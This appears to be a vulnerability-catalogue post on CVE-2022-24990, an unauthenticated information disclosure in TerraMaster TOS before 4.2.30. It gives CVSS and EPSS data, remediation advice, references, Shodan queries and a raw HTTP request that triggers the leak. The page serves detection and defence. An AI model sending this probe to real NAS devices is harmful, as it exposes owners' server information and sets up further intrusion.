---
layout: "post"
cve_id: "CVE-2022-24990"
title: "TerraMaster TOS < 4.2.30 Server Information Disclosure"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-24990.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24990.yaml"
author: "dwisiswant0"
severity: "high"
impact: "An attacker can exploit this vulnerability to gain sensitive information about the server, potentially leading to further attacks.
"
remediation: "Upgrade the TerraMaster TOS server to version 4.2.30 or later to mitigate the vulnerability.
"
reference:
  - "https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/"
  - "https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=33732"
  - "https://forum.terra-master.com/en/viewforum.php?f=28"
  - "http://packetstormsecurity.com/files/172904/TerraMaster-TOS-4.2.29-Remote-Code-Execution.html"
  - "https://github.com/ArrestX/--POC"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2022-24990', 'cwe-id': 'CWE-306', 'epss-score': 0.94284, 'epss-percentile': 0.99934, 'cpe': 'cpe:2.3:o:terra-master:terramaster_operating_system:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'terra-master', 'product': 'terramaster_operating_system', 'shodan-query': ['TerraMaster', 'terramaster']}"
tags:
  - "cve"
  - "cve2022"
  - "packetstorm"
  - "terramaster"
  - "exposure"
  - "kev"
  - "terra-master"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
TerraMaster NAS devices running TOS prior to version 4.2.30 are vulnerable to information disclosure.

## ðŸŒ HTTP Request
```nohighlight
GET /module/api.php?mobile/webNasIPS HTTP/1.1
Host: www.victim.com
User-Agent: TNAS
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

